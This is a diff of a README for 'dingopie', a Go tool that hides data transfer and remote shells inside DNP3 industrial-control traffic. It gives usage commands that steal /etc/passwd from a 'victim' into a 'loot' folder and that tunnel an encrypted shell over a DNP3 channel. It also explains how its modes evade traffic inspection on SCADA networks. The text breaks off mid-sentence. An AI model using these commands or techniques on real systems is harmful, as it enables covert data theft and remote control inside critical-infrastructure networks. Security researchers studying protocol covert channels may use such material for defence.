@@ -1,114 +1,78 @@
 # dingopie :wolf: :cake:
 
-> [D1N0P13](https://github.com/nblair2/d1n0p13) in Go... and better
+> [D1N0P13](https://github.com/nblair2/d1n0p13) in Go...and better
+
+#### `dingopie` is a DNP3 covert channel
 
 ```
-   |\_/|     ▌▘        ▘       ) (
-  /     \   ▛▌▌▛▌▛▌▛▌▛▌▌█▌    ) ( )
- /_ ~ ~ _\  ▙▌▌▌▌▙▌▙▌▙▌▌▙▖  .:::::::.
-    \@/          ▄▌  ▌     ~\_______/~
+▓█████▄  ██▓ ███▄    █   ▄████  ▒█████   ██▓███   ██▓▓█████ 
+▒██▀ ██▌▓██▒ ██ ▀█   █  ██▒ ▀█▒▒██▒  ██▒▓██░  ██▒▓██▒▓█   ▀ 
+░██   █▌▒██▒▓██  ▀█ ██▒▒██░▄▄▄░▒██░  ██▒▓██░ ██▓▒▒██▒▒███   
+░▓█▄   ▌░██░▓██▒  ▐▌██▒░▓█  ██▓▒██   ██░▒██▄█▓▒ ▒░██░▒▓█  ▄ 
+░▒████▓ ░██░▒██░   ▓██░░▒▓███▀▒░ ████▓▒░▒██▒ ░  ░░██░░▒████▒
+ ▒▒▓  ▒ ░▓  ░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒░▒░▒░ ▒▓▒░ ░  ░░▓  ░░ ▒░ ░
+ ░ ▒  ▒  ▒ ░░ ░░   ░ ▒░  ░   ░   ░ ▒ ▒░ ░▒ ░      ▒ ░ ░ ░  ░
+      |\__/|                                     ) (
+     /     \     This skullduggery brought      ) ( )
+    /_.~ ~,_\    to you by the Camp George    :::::::::
+       \@/          West Computer Club       ~\_______/~
 ```
 
-dingopie is a DNP3 covert channel
+![dingopie](.media/dingopie.png)
 
-## Modes
+## Usage
 
-### Forge
+When running dingopie, there are three different options: the role, the mode, and the action. Each is required. The actions are paired, so that one side needs to run each of the actions: `dingopie {server|client} {direct|inject} {{send|receive}|{shell|connect}} ...`
 
-In forge mode, dingopie crafts its own DNP3 messages. Data is sent in DNP3 Application Objects. This traffic will be legitimate protocol-conforming DNP3, but is noticeable. It will originate on a port and host that are not usually communicating using DNP3, and traffic inspection will likely show unusual usage, both in the amount of data transferred and the DNP3 characteristics. The advantage of forge mode is that it can be configured to run at high speeds, between any two devices.
-
-```mermaid
----
-title: dingopie forge mode
----
-sequenceDiagram
-    participant dc as dingopie-client
-    participant c as client
-    participant s as server
-    participant ds as dingopie-server
-
-    activate ds
-    ds-->>ds: Read file / stdin
-    ds-->>ds: Encrypt data (optional)
-    ds-->>s: Open listener (configurable port)
-    activate s
-    activate dc
-    dc-->>c: Open connection
-    c->>s: TCP SYN
-    activate c
-    s->>c: TCP SYN ACK
-    dc-->>c:Get Size
-    c->>s: DNP3 Request (Class 1230)
-    s-->>ds: Get size
-    ds-->>s: Size of data transfer
-    s->>c: DNP3 Response
-    c-->>dc: Size of data transfer
-    loop Transfer data (configurable rate)
-        dc-->>dc: Wait x seconds (configurable)
-        dc-->>c: Get next
-        c->>s: DNP3 Request (Class 123)
-        s-->>ds: Get next
-        ds-->>s: Next n bits (configurable size)
-        s->>c: DNP3 Response (G30 V3 Q0)
-        c-->>dc: Next n bits
-    end
-    ds-->>s: Close listener
-    deactivate ds
-    dc-->>c: Close connection
-    s->>c: TCP FIN ACK
-    c->>s: TCP FIN ACK
-    deactivate s
-    s->>c: TCP ACK
-    deactivate c
-    dc-->>dc: Decrypt data (optional)
-    dc-->>dc: Write file / stdout
-    deactivate dc
+Transfer a file from server to client in direct mode:
+```bash
+# On server
+$ dingopie server direct send --file /etc/passwd
+# on client
+$ dingopie client direct receive --file loot/victim1-etc-passwd.txt --ip 10.1.2.3
 ```
 
-#### Forge Server (outstation)
-
-The forge server acts as a DNP3 outstation, waiting for a client to connect and poll for data.
-
-```
-Usage:
-  dingopie forge server [flags]
-
-Examples:
-  dingopie-forge-server -f /path/to/file.txt
-  dingopie-forge-server "my secret message inline" -p 20001 -k "password"
-
-Flags:
-  -f, --file string   file to read data from (default is command line)
-  -h, --help          help for server
-  -k, --key string    encryption key (default is no encryption)
-  -o, --objects int   number of 32bit objects to send in each response. Higher for increased bandwidth (default 10)
-  -p, --port uint16   port to listen on (default 20000)
+Tunnel a shell over an existing DNP3 stream with encryption
+```bash
+# On outstation
+$ dingopie server inject shell --key secret
+# On master
+$ dingopie client inject connect --ip 10.1.2.3 --key secret
+dingopie >
 ```
 
-#### Forge Client (master)
+### Roles
 
-The forge client acts as a DNP3 master, connecting to a server and pulling data from it.
+#### Server
 
-```
-Usage:
-  dingopie forge client [flags]
+The server role is designed to act like a DNP3 outstation. In direct mode the server _is_ a DNP3 outstation. In inject mode the server should run on (or on network infrastructure just above) a legitimate DNP3 outstation, and should be 'below' the client when thinking in purdue levels. It is important to start the server before the client.
 
-Examples:
-  dingopie forge client 1.2.3.4
-  dingopie forge client 1.2.3.4 -p 20001 -f out.txt -k "password"
+#### Client
 
-Flags:
-  -f, --file string    file to write data to (default is to stdout)
-  -h, --help           help for client
-  -k, --key string     encryption key (default is no encryption)
-  -p, --port uint16    port to connect to (default is 20000) (default 20000)
-  -w, --wait float32   wait in seconds between polls to the server, lower for increased bandwidth (default 5)
-```
+The client role is designed to act like a DNP3 master. In the direct mode the client _is_ a DNP3 master. In inject mode the client should run on (or on network infrasture just below) a legitimate DNP3 master, and should be 'above' the server when thinking in purdue levels. It is important for a dingopie server to be started before the client.
 
-### Filter
+### Modes
 
-> [!NOTE] 
-> :exclamation: **filter mode is not implemented** :exclamation:
-> For a (very slow) POC, see the original [D1N0P13](https://github.com/nblair2/d1n0p13
+#### direct
 
-In filter mode, dingopie 'rides on top of' an existing DNP3 channel. It will intercept and add data to packets as they leave one host, and on the other side will intercept and remove this data before allowing the packets to continue on to the legitimate SCADA program. This will increase the size of packets sent between devices, but will take place over an existing DNP3 connection and is much less likely to be noticed. The disadvantage of filter mode is that its speed is constrained by the channel that it is using.
+In direct mode, dingopie creates a new DNP3 channel. Data is sent in DNP3 Application Objects. This traffic will be legitimate protocol-conforming DNP3, but is noticeable. It will originate on a port and host that are not usually communicating using DNP3, and traffic inspection will likely show unusual usage, both in the amount of data transferred and the DNP3 characteristics. The advantage of direct mode is that it can be configured to run at high speeds, between any two devices.
+
+#### inject
+
+> [!WARNING]
+> inject mode is not implemented (yet)
+
+In inject mode, 'rides on top of' an existing DNP3 channel. Data is added to existing DNP3 packets (ostensibly created by a legitimate DNP3 program) as they leave one host, and on the other side this data is removed before allowing the packets to continue on to the legitimate other client's DNP3 program. This will increase the size of packets sent between devices, but will take place over an existing DNP3 connection and is much less likely to be noticed. The disadvantage of filter mode is that its speed is constrained by the channel that it is using. 
+
+### Actions
+
+#### send|receive  
+
+The send/receive action simply transfers data in one direction (either server to client or the reverse).
+
+#### shell|connect
+
+> [!WARNING]
+> the shell|connect action  is not implemented (yet)
+
+The shell/connect action creates a pty on one device and allows the connecting dev
